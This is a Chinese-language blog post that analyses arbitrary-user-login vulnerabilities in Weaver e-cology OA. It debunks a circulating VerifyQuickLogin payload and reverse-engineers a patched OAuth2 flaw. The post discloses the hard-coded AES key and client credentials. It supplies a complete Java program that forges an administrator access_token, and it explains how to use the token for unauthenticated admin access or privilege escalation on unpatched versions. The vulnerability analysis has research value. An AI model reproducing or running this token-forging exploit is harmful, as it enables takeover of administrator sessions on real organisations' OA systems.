0x00 前言
=======

在攻防演练期间，大家都有所耳闻，听到过某OA的存在任意用户登录的漏洞，可能听说最多的还都是`/mobile/plugin/VerifyQuickLogin.jsp`这个接口，而且传的有头有尾的，像是真的0day一样。然后在复现过程中一定会发现：啊，这影响的资产也太少了吧，甚至没有。

大多数网传payload都是这样的：

```php
URL: /mobile/plugin/VerifyQuickLogin.jsp
payload: identifier=1&language=1&ipaddress=
```

0x01 VerifyQuickLogin任意登录分析
===========================

首先，这个应该不是最近暴的0day，最早出现poc的时候，是今年的3月份，链接如下：

[泛微-协同办公OA任意管理员登录.json](https://github.com/xiaotu0821/Web-Scan/blob/33804ce69e17187d66cae8ba8552087904692c81/poc/%E6%B3%9B%E5%BE%AEOA%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%ACOA%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95.json)

该大佬已在2022年3月23日的时候将poc上传到了GitHub。

1.1 VerifyQuickLogin接口
----------------------

接下来进行分析：

(1)首先是各种参数的获取过程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ed79fed4329ee5d5773869c2e7de3e72be86c0c8.png)

(2)带入`ps.login`进行登录，传入的参数有：`identifier`, `language`和`ipaddress`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-119ef04968c708fd8c83c24fe7dd74139160b07b.png)

(3)跟进`ps.login`方法，实现如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-4199999826fd8c0416941cdc6b59a55ac2feccf0.png)

这里可以看到，`var3`也就是`ipaddress`参数的传入值，肯定不能为空，网传的payload到这就错了。

(4)sessionKey被返回给前端

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-26e27f178c0db5fabffa63c4cdd5c43a836992c9.png)

经过一系列处理后，直接返回给了前端。

所以这第一步的利用应该是这样的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fcace6d791a2a0b281a2fa0de5ea84c67056627b.png)

然而也返回了一个`ecology_JSessionid`,这个是不能用的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-96d2fe8171a35ce07b4c6c744fe7068c50999a5c.png)

所以还需要第二步，`/mobile/plugin/plus/login/LoingFromEb.jsp`接口来配合。

1.2 LoingFromEb.jsp配合
---------------------

当想分析这个的时候，发现我的安装版本竟然都没这个文件。

我的版本：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ad2e2bb199213bd4d31b42cdbd725833f4eb0e6d.png)

然后在互联网上，看到了这个漏洞的利用方式，链接如下：

<https://www.yuque.com/u2276855/hqe792/exrd16>

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1363b87e0ad2648416cc5f748d65c9c6af753ba0.png)

1.3 总结
------

我看语雀上文章的配图里面获取sessionKey的截图已经是2021年的图了。

而且，我扫了些，并没有看到任何存在该漏洞的网站。（poc只验证2.1步骤，未发现能获取到sessionKey的），失望。

加上我手里几个版本的代码里面都没有那个LoingFromEb.jsp的文件，这个漏洞是什么时候修复的，就不太清楚了。

我手里最早的代码，2020.09.10的安全配置里边，就设置了该接口需要登录了，如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f6bc01ab267d8d7b1f47993fc9e46f257b34e477.png)

所以，该漏洞应该比较古老，可能有2年左右了，也可能是我复现过程有问题，欢迎大家评论区指正。

0x02 oauth2下的任意用户登录
===================

如果说没有任意用户登录的话，也有点太片面了，于是我下载了最新的补丁包2022.08.05那个，对比了补丁文件，在`WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForWeb0704.class`中，倒是也发现了一处刚补丁的任意用户登录。

该补丁首次出现在`v10.48`的补丁包里面，在`v10.54`补丁包里面做了修改。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-dd295a76e485e72bf83fe946d6ac5bb36ca97153.png)

可以看到，他在里面禁用了`/api/integration/oauth2/`下的三个接口，并且拦截说明是漏洞利用，那么我们之间找到接口进行分析。

漏洞在`com.api.integration.web.OAuth2ServerAction`中，

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e077e62a44838edbd12a5a11a9ce3f810cbad229.png)

该路径下，实现了三个接口，正常的逻辑大概是：

`authorize`接口生成一个code -&gt; `accessToken`接口根据当前登录的用户id，生成一个token -&gt; `profile`查询token对应的用户信息，并set-cookie。

其中第一步是与漏洞无关的，我们重点关注第二、第三步。

2.1 `accessToken`接口
-------------------

部分不太重要的逻辑，就省略掉了，直接到重点：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-7559ec8ebdea3ebd12cef676bf78ba8789269c4c.png)

(1)从请求中获取当前用户

(2)判断用户不为空

(3)设置`var13`，值为`client_id`、`client_secret`、时间戳和uid的组合

其中`client_id`和`client_secret`是写死的，如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d5901a8ea45407ca153b7bbc88c35cf7767dd21a.png)

(4)带入AES加密，密钥是`youkongjian`

现在知道了`accessToken`的加密过程了，而且其中未涉及不可控值，所以存在伪造的机会。

2.2 `profile`接口
---------------

(1)获取`client_id`、`client_secret`和`access_token`，并解密：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a95f679362d1836333196681f6b80f1c61cc1883.png)

将解密后的字符串根据`|`分割成数组。

(2)如果当前用户为空，或uid与`access_token`不一致，则重新创建session，并将`access_token`中的用户uid写入session。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-58025e30c069362116fdf0bf11fc1042c272c709.png)

(3)查询uid对应用户，将信息返回前端

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-31d4d814a915f9d55cfec9280ade61893484f166.png)

2.3 总结
------

可以看出，`accessToken`接口说明了`access_token`的加密过程，在`profile`接口进行解密，直接创建了新的session，从而导致漏洞存在。看效果图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-86afb111ebe8848ceb0c7d26cbc8895172b53e02.png)

返回的`ecology_JSessionid`为管理员的sessionid。测试cookie是否有效：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1c3326e1633323d50e5f90ef08e039cc4f0ca637.png)

2.4 payload
-----------

你们最期待的东西。

```java
import com.sun.crypto.provider.SunJCE;  
import sun.security.provider.Sun;  

import javax.crypto.\*;  
import javax.crypto.spec.SecretKeySpec;  
import java.security.\*;  

public class userLogin {  
    public static void main(String\[\] args) {  
        String access\_token = encrypt("2ad1b008-38ed-44e4-a113-ef1ee31407c1|L68GFSAH3EBT|"\+ System.currentTimeMillis() +"|1","youkongjian");  
        System.out.print(access\_token);  
    }  
    public static String encrypt(String var0, String var1) {  
        byte\[\] var2 = null;  

        try {  
            KeyGenerator var3 = KeyGenerator.getInstance("AES");  
            SecureRandom var4 = SecureRandom.getInstance("SHA1PRNG");  
            var4.setSeed(var1.getBytes());  
            var3.init(128, var4);  
            SecretKey var5 = var3.generateKey();  
            byte\[\] var6 = var5.getEncoded();  
            SecretKeySpec var7 = new SecretKeySpec(var6, "AES");  
            Cipher var8 = Cipher.getInstance("AES", "SunJCE");  
            byte\[\] var9 = var0.getBytes();  
            var8.init(1, var7);  
            var2 = var8.doFinal(var9);  
        } catch (NoSuchProviderException var10) {  
            var10.printStackTrace();  
        } catch (NoSuchAlgorithmException var11) {  
            var11.printStackTrace();  
        } catch (NoSuchPaddingException var12) {  
            var12.printStackTrace();  
        } catch (InvalidKeyException var13) {  
            var13.printStackTrace();  
        } catch (IllegalBlockSizeException var14) {  
            var14.printStackTrace();  
        } catch (BadPaddingException var15) {  
            var15.printStackTrace();  
        }  

        return var2 == null ? "" : parseByte2HexStr(var2);  
    }  
    private static String parseByte2HexStr(byte\[\] var0) {  
        StringBuffer var1 = new StringBuffer();  

        for(int var2 = 0; var2 < var0.length; ++var2) {  
            String var3 = Integer.toHexString(var0\[var2\] & 255);  
            if (var3.length() == 1) {  
                var3 = '0' \+ var3;  
            }  

            var1.append(var3.toUpperCase());  
        }  

        return var1.toString();  
    }  
}
```

运行后，会生成access\_token.

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9dd80290f94a34772a05ee9e20bfd59689077164.png)

2.5 利用说明
--------

该漏洞利用有两种方式：

1.低版本的ecology中未修复Api绕过鉴权的方法，可以使用该方法绕过鉴权访问到接口，从而实现未授权访问get admin

2.修复Api绕过鉴权后的版本~v10.48之间，可以用低权限用户调用该接口，实现用户提权，获得管理员权限。